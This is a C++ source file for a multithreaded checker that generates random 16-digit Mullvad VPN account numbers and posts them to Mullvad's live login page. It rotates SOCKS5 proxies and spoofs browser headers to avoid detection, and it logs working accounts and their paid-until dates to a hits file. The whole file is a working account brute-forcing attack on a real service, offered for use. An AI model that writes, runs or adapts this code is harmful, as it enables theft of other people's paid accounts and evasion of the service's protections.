#include "../include/mullvad.hpp"
#include "../include/curl_handle_manager.hpp"
#include "../include/curl_header_list.hpp"
#include "../include/utils.hpp"
#include <filesystem>
#include <fmt/format.h>
#include <fstream>
#include <mutex>
#include <random>
#include <string>
#include <unordered_map>
#include <vector>

std::string Mullvad::getRandomProxy(const std::vector<std::string> &proxies)
{
  if (proxies.empty()) {
    return "";
  }
  std::uniform_int_distribution<size_t> dist(0, proxies.size() - 1);
  return proxies[dist(rng)];
}

bool Mullvad::createOutputDirectory()
{
  try {
    if (!std::filesystem::exists(outputDir)) {
      return std::filesystem::create_directories(outputDir);
    }
    return true;
  } catch (const std::filesystem::filesystem_error &e) {
    print(fmt::format("[!] Failed to create output directory: {}", e.what()));
    return false;
  }
}

bool Mullvad::writeFile(const std::string &filename,
                        const std::string &content)
{
  if (filename.empty() || content.empty()) {
    print(fmt::format("[!] Empty filename or content string."));
    return false;
  }
  try {
    createOutputDirectory();
    std::string fullPath = outputDir + "/" + filename;
    std::lock_guard<std::mutex> lock(fileMutex);
    std::ofstream fout(fullPath, std::ios::app);
    if (!fout.is_open()) {
      throw std::runtime_error(
          fmt::format("[!] Failed to open file: {}", fullPath));
    }
    fout << content << std::endl;
    return true;
  } catch (const std::exception &e) {
    print(fmt::format("[!] Failed to write to file: {}", e.what()));
    return false;
  }
}

void Mullvad::print(const std::string &message)
{
  std::lock_guard<std::mutex> lock(consoleMutex);
  fmt::print("{}", message);
}

void Mullvad::logResult(const std::string &account, const std::string &capture,
                        AccountStatus status)
{
  if (status == AccountStatus::HIT || status == AccountStatus::CUSTOM) {
    std::string filename =
        (status == AccountStatus::HIT) ? "hit.txt" : "custom.txt";
    std::string content = fmt::format("{} | {}", account, capture);
    writeFile(filename, content);
  } else if (status == AccountStatus::ERROR) {
    writeFile("errors.txt", fmt::format("[!] ERROR {}", account));
  }
}

void Mullvad::handleResult(AccountStatus status,
                           const std::string &accountNumber,
                           const std::string &details)
{
  switch (status) {
  case AccountStatus::HIT:
    hitCount++;
    break;
  case AccountStatus::CUSTOM:
    customCount++;
    break;
  case AccountStatus::BAD:
    badCount++;
    break;
  case AccountStatus::ERROR:
    errorCount++;
    break;
  }
  std::string message;
  if (status == AccountStatus::HIT || status == AccountStatus::CUSTOM) {
    message = fmt::format(statusStyles.at(status), "[+] {} | {} | {}",
                          (status == AccountStatus::HIT ? "HIT" : "CUSTOM"),
                          accountNumber, details);
    logResult(accountNumber, details, status);
  } else if (status == AccountStatus::BAD) {
    message = fmt::format(statusStyles.at(status), statusFormats.at(status),
                          accountNumber);
  } else {
    message = fmt::format(statusStyles.at(status), statusFormats.at(status),
                          details.empty() ? accountNumber : details);
    logResult(accountNumber, "Error", status);
  }
  print(message);
  printStats();
}

void Mullvad::printStats()
{
  std::lock_guard<std::mutex> lock(consoleMutex);
  if (hitCount.load() > 0) {
    fmt::print(fg(fmt::color::green),
               "Hits: {} | Custom: {} | Bad: {} | Errors: {}\n",
               hitCount.load(), customCount.load(), badCount.load(),
               errorCount.load());
  } else {
    fmt::print(fg(fmt::color::red),
               "Hits: {} | Custom: {} | Bad: {} | Errors: {}\n",
               hitCount.load(), customCount.load(), badCount.load(),
               errorCount.load());
  }
}

Mullvad::Mullvad(int timeout, const std::string &outputDirOverride)
    : rng(std::random_device{}()), curlManager(MAX_THREADS * 2),
      timeoutMs(timeout)
{
  curl_global_init(CURL_GLOBAL_ALL);
  outputDir =
      outputDirOverride.empty() ? generateDateFolderName() : outputDirOverride;
  createOutputDirectory();
  print(fmt::format("[+] Results will be saved in: {}\n", outputDir));
}

Mullvad::~Mullvad() { curl_global_cleanup(); }

const std::string &Mullvad::getOutputDir() const { return outputDir; }

std::string Mullvad::generateAccountNumber()
{
  std::uniform_int_distribution<int> dis(0, 9);
  std::string num;
  num.reserve(16);
  for (int i = 0; i < 16; ++i) {
    num += std::to_string(dis(rng));
  }
  return num;
}

bool Mullvad::createAccount(const std::string &accountNumber)
{
  return writeFile("created.txt", accountNumber);
}

std::vector<std::string> Mullvad::readFile(const std::string &filename)
{
  std::vector<std::string> lines;
  lines.reserve(100);
  if (filename.empty()) {
    return lines;
  }
  try {
    std::ifstream fin(filename);
    if (!fin.is_open()) {
      return lines;
    }
    std::string line;
    line.reserve(256);
    while (std::getline(fin, line)) {
      if (!line.empty()) {
        lines.push_back(std::move(line));
        line.clear();
        line.reserve(256);
      }
    }
  } catch (const std::exception &e) {
    print(fmt::format("[!] Exception: {}\n", e.what()));
  }
  return lines;
}

size_t Mullvad::HeaderCallback(char *buffer, size_t size, size_t nitems)
{
  size_t bytes = size * nitems;
  std::string header(buffer, bytes);
  return bytes;
}

int Mullvad::getTotalHits() const { return hitCount.load(); }
int Mullvad::getTotalCustom() const { return customCount.load(); }
int Mullvad::getTotalBad() const { return badCount.load(); }
int Mullvad::getTotalErrors() const { return errorCount.load(); }

void Mullvad::checkAccount(const std::string &accountNumber,
                           const std::vector<std::string> &proxies)
{
  static const char *loginUrl = "https://mullvad.net/en/account/login";
  std::string proxy;
  if (!proxies.empty()) {
    proxy = fmt::format("socks5://{}", strip(getRandomProxy(proxies)));
  }
  CURL *curlHandle = curlManager.getHandle();
  if (!curlHandle) {
    handleResult(AccountStatus::ERROR, accountNumber,
                 "Failed to initialize CURL");
    return;
  }
  std::string responseData;
  responseData.reserve(4096);
  CurlHeaderList headers;
  headers.append("Content-Type: application/x-www-form-urlencoded");
  headers.append("Referer: https://mullvad.net/en/account/login");
  headers.append("Origin: https://mullvad.net");
  headers.append(
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36");
  curl_easy_setopt(curlHandle, CURLOPT_COOKIEFILE, "");
  curl_easy_setopt(curlHandle, CURLOPT_COOKIEJAR, "");
  std::string postFields = fmt::format("account_number={}", accountNumber);
  curl_easy_setopt(curlHandle, CURLOPT_URL, loginUrl);
  curl_easy_setopt(curlHandle, CURLOPT_POST, 1L);
  curl_easy_setopt(curlHandle, CURLOPT_POSTFIELDS, postFields.c_str());
  if (!proxy.empty()) {
    curl_easy_setopt(curlHandle, CURLOPT_PROXY, proxy.c_str());
    curl_easy_setopt(curlHandle, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
  }
  curl_easy_setopt(
      curlHandle, CURLOPT_USERAGENT,
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, "
      "like Gecko) Chrome/110.0.0.0 Safari/537.36");
  curl_easy_setopt(curlHandle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
  curl_easy_setopt(curlHandle, CURLOPT_SSL_CIPHER_LIST,
                   "TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_"
                   "POLY1305_SHA256");
  curl_easy_setopt(curlHandle, CURLOPT_CONNECTTIMEOUT, 10L);
  curl_easy_setopt(curlHandle, CURLOPT_TIMEOUT, 30L);
  curl_easy_setopt(curlHandle, CURLOPT_HTTPHEADER, headers.get());
  curl_easy_setopt(curlHandle, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_3);
  curl_easy_setopt(curlHandle, CURLOPT_FOLLOWLOCATION, 0L);
  curl_easy_setopt(curlHandle, CURLOPT_WRITEFUNCTION, WriteCallback);
  curl_easy_setopt(curlHandle, CURLOPT_WRITEDATA, &responseData);
  curl_easy_setopt(curlHandle, CURLOPT_HEADERFUNCTION, HeaderCallback);
  CURLcode res = curl_easy_perform(curlHandle);
  if (res != CURLE_OK) {
    handleResult(AccountStatus::ERROR, accountNumber, curl_easy_strerror(res));
    curlManager.releaseHandle(curlHandle);
    return;
  }
  long httpCode = 0;
  curl_easy_getinfo(curlHandle, CURLINFO_RESPONSE_CODE, &httpCode);
  if (responseData.find("\"type\":\"redirect\"") != std::string::npos) {
    size_t locationStart = responseData.find("\"location\":\"");
    size_t locationEnd = std::string::npos;
    if (locationStart != std::string::npos) {
      locationStart += 12;
      locationEnd = responseData.find("\"", locationStart);
      if (locationEnd != std::string::npos) {
        std::string redirectPath =
            responseData.substr(locationStart, locationEnd - locationStart);
        std::string redirectUrl = "https://mullvad.net" + redirectPath;
        responseData.clear();
        CurlHeaderList redirectHeaders;
        redirectHeaders.append("Referer: https://mullvad.net/en/account/login");
        redirectHeaders.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; "
                               "Win64; x64) AppleWebKit/537.36 (KHTML, like "
                               "Gecko) Chrome/110.0.0.0 Safari/537.36");
        curl_easy_setopt(curlHandle, CURLOPT_URL, redirectUrl.c_str());
        curl_easy_setopt(curlHandle, CURLOPT_POST, 0L);
        curl_easy_setopt(curlHandle, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curlHandle, CURLOPT_HTTPHEADER, redirectHeaders.get());
        res = curl_easy_perform(curlHandle);
        if (res != CURLE_OK) {
          handleResult(AccountStatus::ERROR, accountNumber,
                       curl_easy_strerror(res));
          curlManager.releaseHandle(curlHandle);
          return;
        }
        curl_easy_getinfo(curlHandle, CURLINFO_RESPONSE_CODE, &httpCode);
        if (redirectPath.find("/account") != std::string::npos) {
          if (responseData.find("No time left") != std::string::npos) {
            handleResult(AccountStatus::CUSTOM, accountNumber,
                         "Expired account - No time left");
          } else if (responseData.find("Paid until") != std::string::npos) {
            size_t timeTagPos = responseData.find("data-cy=\"account-expiry\"");
            if (timeTagPos != std::string::npos) {
              size_t datetimePos = responseData.find("datetime=\"", timeTagPos);
              if (datetimePos != std::string::npos) {
                datetimePos += 10;
                size_t datetimeEnd = responseData.find("\"", datetimePos);
                std::string expiryDate =
                    responseData.substr(datetimePos, datetimeEnd - datetimePos);
                handleResult(AccountStatus::HIT, accountNumber,
                             "Paid until " + expiryDate);
              } else {
                size_t expiryPos = responseData.find("Paid until");
                std::string expiryInfo = "Active account";
                if (expiryPos != std::string::npos) {
                  size_t startPos = expiryPos + 10;
                  size_t endPos = responseData.find("<", startPos);
                  if (endPos != std::string::npos) {
                    expiryInfo =
                        "Paid until " +
                        strip(responseData.substr(startPos, endPos - startPos));
                  }
                }
                handleResult(AccountStatus::HIT, accountNumber, expiryInfo);
              }
            } else {
              handleResult(AccountStatus::HIT, accountNumber,
                           "Active account (couldn't parse expiry)");
            }
          } else {
            handleResult(AccountStatus::HIT, accountNumber, "Active account");
          }
        } else {
          handleResult(AccountStatus::CUSTOM, accountNumber,
                       "Account exists but no subscription info");
        }
      } else {
        handleResult(AccountStatus::BAD, accountNumber);
      }
    } else {
      handleResult(AccountStatus::ERROR, accountNumber,
                   "Redirect location not found in response");
    }
  } else {
    if (responseData.find("Bad account number") != std::string::npos ||
        responseData.find("error") != std::string::npos) {
      handleResult(AccountStatus::BAD, accountNumber);
    }
  }
  curlManager.releaseHandle(curlHandle);
}